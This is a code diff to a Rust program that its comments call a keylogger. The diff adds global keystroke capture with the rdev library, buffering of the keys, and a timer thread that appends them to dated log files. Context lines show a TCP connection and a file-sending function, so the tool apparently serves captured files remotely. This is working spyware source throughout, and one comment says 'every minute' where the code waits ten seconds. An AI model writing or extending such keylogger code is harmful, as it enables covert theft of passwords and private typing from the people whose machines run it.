@@ -1,9 +1,12 @@
+use chrono::Local;
 use rdev::{listen, EventType};
 use std::env;
 use std::fs::File;
+use std::fs::OpenOptions;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
 use std::thread;
+use std::time::Duration;
 use std::{
     io::{self, Read, Write},
     net::{TcpListener, TcpStream},
@@ -16,18 +19,43 @@ fn main() -> std::io::Result<()> {
     // Arc and Mutex to share the stream between the main thread and the keylogger
     let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));
 
+    // Shared keystroke log buffer
+    let keystroke_log = Arc::new(Mutex::new(String::new()));
+
     // Clone the Arc for the keylogger thread
-    let keylogger_stream = Arc::clone(&stream_mutex);
+    // let keylogger_stream = Arc::clone(&stream_mutex);
+    let log_clone = Arc::clone(&keystroke_log);
 
     // Start keylogger in a separate thread
     thread::spawn(move || {
         if let Err(error) = listen(move |event| {
             if let EventType::KeyPress(key) = event.event_type {
                 let key_str = format!("{:?}", key);
-                println!("Key pressed: {}", key_str);
+
+                // Append captured key to the keystroke log buffer
+                let mut log_data = log_clone.lock().unwrap();
+                log_data.push_str(&key_str);
+                log_data.push('\n');
             }
         }) {
             eprintln!("Error: {:?}", error);
+        }
+    });
+
+    // Start logging to a file at regular intervals
+    let log_clone = Arc::clone(&keystroke_log);
+    thread::spawn(move || {
+        loop {
+            thread::sleep(Duration::from_secs(10));
+
+            // Write the captured keystrokes to a log file every minute
+            let mut log_data = log_clone.lock().unwrap();
+            if !log_data.is_empty() {
+                if let Err(e) = append_to_log(&log_data) {
+                    eprintln!("Failed to write to log file: {}", e);
+                }
+                log_data.clear();
+            }
         }
     });
 
@@ -185,5 +213,20 @@ fn send_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
     }
 
     println!("File sent: {}", filename);
+    Ok(())
+}
+
+// Appends the keystrokes to a log file
+fn append_to_log(data: &str) -> io::Result<()> {
+    let now = Local::now();
+    let timestamp = now.format("%Y-%m-%d %H:%M:%S");
+    let file_name = format!("keylogger_{}.log", now.format("%Y-%m-%d"));
+
+    let mut file = OpenOptions::new()
+        .append(true)
+        .create(true)
+        .open(file_name)?;
+
+    file.write_all(format!("{} - {}\n", timestamp, data).as_bytes())?;
     Ok(())
 }
